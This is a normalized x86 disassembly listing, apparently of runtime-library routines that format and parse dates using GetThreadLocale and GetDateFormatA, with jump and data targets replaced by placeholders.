mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409bcc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409a94
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409c04
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4097e8
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409c44
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409d92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404038
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409d99
lea eax [ ebp - 0x118 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4042a8
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4042f8
mov edx eax
mov eax [ ebx ]
call sub_40c210
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c384
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404558
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c320
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404230
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c384
mov ecx eax
mov eax ebx
mov edx esi
call sub_404128
sub_409dac
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409e8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404038
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409e91
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4042a8
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4042f8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404558
sub_409eb4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a635
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a63c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_40405c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c404
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c3e4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409af0
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c404
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409af0
pop ecx
mov al [ eax + lookup_table_409f97 ]
jmp [ eax * 4 + jump_table_409fd0 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409ba0
pop ecx
push ebp
call sub_409bcc
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409ba0
pop ecx
push ebp
call sub_409bcc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409c44
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409b34
pop ecx
jmp r-xdata
push ebp
call sub_409ba0
pop ecx
push ebp
call sub_409bcc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409dac
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409b34
pop ecx
jmp r-xdata
push ebp
call sub_409ba0
pop ecx
push ebp
call sub_409bcc
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409ba0
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409ba0
pop ecx
push ebp
call sub_409c04
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409ba0
pop ecx
push ebp
call sub_409c04
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409ba0
pop ecx
push ebp
call sub_409c04
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409ba0
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409ba0
pop ecx
push ebp
call sub_409c04
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409c04
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408990
test eax eax
jne r-xdata
push ebp
call sub_409ba0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409eb4
pop ecx
push ebp
call sub_409c04
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409b54
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409b54
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409b54
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409bcc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409b54
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409b54
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409b54
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409eb4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409eb4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409b54
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408990
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409af0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409eb4
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409af0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409af0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409b34
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ab4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b34
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408990
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409af0
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409af0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409b34
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ab4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b34
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c404
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408990
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409af0
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409eb4
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409b54
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408990
test eax eax
jne r-xdata
push ebp
call sub_409bcc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ab4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b34
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b34
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b34
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c404
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409eb4
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409af0
pop ecx
jmp r-xdata
push ebp
call sub_409bcc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ab4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b34
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408990
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408990
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408990
test eax eax
jne r-xdata
jmp r-xdata
sub_40a668
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409eb4
pop ecx
push ebp
mov eax ebx
call sub_409eb4
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404128
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a6d8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4042f8
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a6fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a6d8
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4042f8
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a790
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a809
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a810
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a6d8
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4042f8
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404558
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_408064
test eax eax
jne r-xdata
mov eax edi
call sub_4042f8
add [ esi ] eax
mov bl 0x1
sub_40a81c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a6d8
mov eax esi
call sub_4042f8
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a854
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4042f8
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a8a0
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4042f8
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c448
mov [ ebx ] eax
jmp r-xdata
sub_40a8e8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4044f8
push eax
mov eax [ ebx ]
call sub_4044f8
pop edx
call sub_40c548
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a93c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409adc
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a998
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40acb3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a854
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c484
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a6fc
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a8a0
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404558
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_4080d4
mov eax [ ebp - 0x1c ]
call sub_40a8e8
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40acba
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_40405c
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a81c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a6fc
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a81c
test al al
je r-xdata
call sub_409adc
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a6fc
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409880
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_40463c
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a81c
mov edx ebx
mov eax esi
call sub_40a6d8
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4042f8
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a8a0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a93c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a6d8
mov eax esi
call sub_4042f8
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409adc
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4042f8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404558
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_408064
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4042f8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404558
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_408064
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40acdc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a790
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a790
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a790
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a6fc
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a6d8
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a790
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a81c
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a6fc
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a790
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a81c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a6d8
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409778
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
